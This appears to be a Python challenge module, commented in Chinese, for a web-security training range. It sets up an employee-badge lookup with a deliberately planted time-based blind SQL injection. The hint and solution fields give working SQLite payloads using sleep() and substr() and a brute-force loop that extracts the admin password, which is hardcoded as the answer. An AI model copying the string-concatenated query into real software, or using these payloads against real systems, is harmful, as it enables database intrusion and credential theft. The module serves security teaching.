"""员工工号查询处的时间盲注。

页面**永远说同一句话**：不管查询成功、失败、还是命中，返回的 HTML 一个字都不差。
所以这里连"有没有这条记录"都读不出来 —— 唯一的信号是**响应花了多长时间**。

为此这一题注册了一个自定义 SQL 函数 `sleep()`：SQLite 没有内置的 SLEEP
（MySQL/Postgres 有），而真实项目里通过 `create_function` 注册自定义 SQL 函数
是很常见的做法。有了它，这里的 payload 跟 MySQL 上的写法就是一样的了。
"""

import sqlite3
import threading
import time

from vuln4all import Vuln, render_template, request

#: admin 的密码。这一题的目标是**用时间把它一位一位猜出来**。
#: 长度和字符集在提示里给了 —— 那道"猜"的活儿本身不难，难的是建立信道。
SECRET = "k3y9f2"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"

#: 超过这么久就认为"有人往查询里塞了延迟"。
#: 一次本地 sqlite 查询是毫秒级的，所以 2 秒已经是三个数量级的余量。
DELAY_THRESHOLD = 2.0

#: **单个请求**能睡多久的上限。
#:
#: 只封单次 sleep() 调用是不够的：
#:   · SQLite 会按扫描到的行重复求值，3 行就是 3 倍
#:   · payload 里还能连着写好几个 sleep()
#: 所以这里用一个"每次请求重新发放的预算"，跨多次调用累计扣减。
MAX_TOTAL_DELAY = 12.0

#: 每个线程一套预算 —— 靶场是 threaded=True，共享一个变量会互相串。
_BUDGET = threading.local()

GOAL_ORACLE = "让页面产生可测量的延迟（时间盲注的信道建立了）"
GOAL_EXTRACTED = "把 admin 的密码完整猜出来并提交"


class TimeBlind(Vuln):
    info = {
        "name": "工号查询处的时间盲注",
        "author": ["guaidao2"],
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "这一题的页面**不管输入什么都返回一模一样的 HTML** —— "
            "没有报错、没有回显、连「有没有这条记录」都看不出来。"
            "唯一能读出信息的地方是响应时间。"
        ),
        "hint": (
            "先随便输点什么，确认页面真的什么都不告诉你。\n"
            "然后想：如果我能让这条查询「条件成立时慢 3 秒」，是不是就等于"
            "给自己造了一个一位一位的开关？\n"
            "这一题注册了一个自定义 SQL 函数 sleep(秒数) —— 先试试把它塞进 WHERE 里。\n"
            "目标密码是 6 位，字符集是小写字母加数字（36 个）。"
        ),
        "solution": (
            "一、先确认延迟能被触发。查一个不存在的工号，然后：\n"
            "   ' OR sleep(1) -- \n"
            "   这一下会明显卡住 —— 信道就有了。\n"
            "   （注意：SQLite 是按扫描到的行逐行求值 WHERE 的，这张表有 3 行，\n"
            "     所以 sleep(1) 实际会慢 3 秒左右。真实盲注里也是这样，\n"
            "     表的行数会放大你的延迟 —— 脚本里要按实际慢多少来定阈值。）\n\n"
            "二、把 sleep 变成条件式的，一位一位问：\n"
            "   ' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='k'\n"
            "        THEN sleep(1) ELSE 1 END -- \n"
            "   慢 → 猜对了；快 → 猜错了。把 substr 的第二参数从 1 数到 6 就出全了。\n\n"
            "三、猜完把密码提交到页面上那个框里。\n\n"
            "写脚本的话（伪代码）：\n"
            "   for pos in 1..6:\n"
            "       for ch in alphabet:\n"
            "           发请求，payload 里判断 substr(password,pos,1)=ch\n"
            "           if 耗时 > 2 秒: 记下这个字符; break\n"
            "   一共最多 6 × 36 = 216 个请求。\n\n"
            "现实里更省请求的做法：\n"
            "  · 二分法猜字符：用 `> 'm'` 这种比较，把 36 个字符压到 log2(36) ≈ 6 次\n"
            "  · 一次问整个哈希：`substr(hex(password),1,1)` 之类\n"
            "  · 盲注工具（sqlmap 的 --technique=T）会自动做这些事"
        ),
        "refs": [
            "https://portswigger.net/web-security/sql-injection/blind",
            "https://owasp.org/Top10/A03_2021-Injection/",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / "hr.db"))
        con.executescript(
            """
            CREATE TABLE employees (
                badge TEXT PRIMARY KEY,
                name  TEXT NOT NULL
            );
            INSERT INTO employees (badge, name) VALUES
                ('A1001', '张三'),
                ('A1002', '李四'),
                ('A1003', '王五');

            CREATE TABLE users (
                username TEXT PRIMARY KEY,
                password TEXT NOT NULL
            );
            INSERT INTO users (username, password) VALUES ('admin', '%s');
            """
            % SECRET
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / "hr.db")

        def connect():
            con = sqlite3.connect(db_path)

            def sleep(seconds):
                try:
                    seconds = float(seconds)
                except (TypeError, ValueError):
                    seconds = 0.0
                seconds = max(0.0, seconds)

                # 扣这次请求的预算。预算用完了就直接返回，不再睡 ——
                # 这样"一个请求最多占住多久"是有保证的，而不是"每次调用最多多久"。
                left = getattr(_BUDGET, "left", 0.0)
                if left <= 0:
                    return 1
                nap = min(seconds, left)
                time.sleep(nap)
                _BUDGET.left = left - nap
                return 1

            con.create_function("sleep", 1, sleep)
            return con

        @app.route("/", methods=["GET", "POST"])
        def index():
            badge = ""
            elapsed = None
            feedback = None

            if request.method == "POST" and "badge" in request.form:
                badge = request.form.get("badge", "")

                # ↓↓↓ 洞就在这里：工号直接拼进 SQL ↓↓↓
                sql = "SELECT name FROM employees WHERE badge = '%s'" % badge
                # ↑↑↑ 正确做法：con.execute("... WHERE badge = ?", (badge,)) ↑↑↑

                started = time.monotonic()
                _BUDGET.left = MAX_TOTAL_DELAY      # 发这一次请求的预算
                con = connect()
                try:
                    con.execute(sql).fetchone()
                except sqlite3.Error:
                    pass  # 报错也不说 —— 这一题唯一的信号是时间
                finally:
                    con.close()
                elapsed = time.monotonic() - started

                if elapsed > DELAY_THRESHOLD:
                    ctx.progress.mark(GOAL_ORACLE)

            elif request.method == "POST":
                # 第二个表单：提交猜出来的密码
                guess = request.form.get("guess", "").strip()
                if guess:
                    if guess == SECRET:
                        ctx.progress.mark(GOAL_EXTRACTED)
                        feedback = ("ok", "密码对了。")
                    else:
                        feedback = ("bad", "不对。")

            return render_template(
                "index.html",
                badge=badge,
                elapsed=elapsed,
                feedback=feedback,
                length=len(SECRET),
                alphabet_size=len(ALPHABET),
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {
            GOAL_ORACLE: ctx.progress.achieved(GOAL_ORACLE),
            GOAL_EXTRACTED: ctx.progress.achieved(GOAL_EXTRACTED),
        }
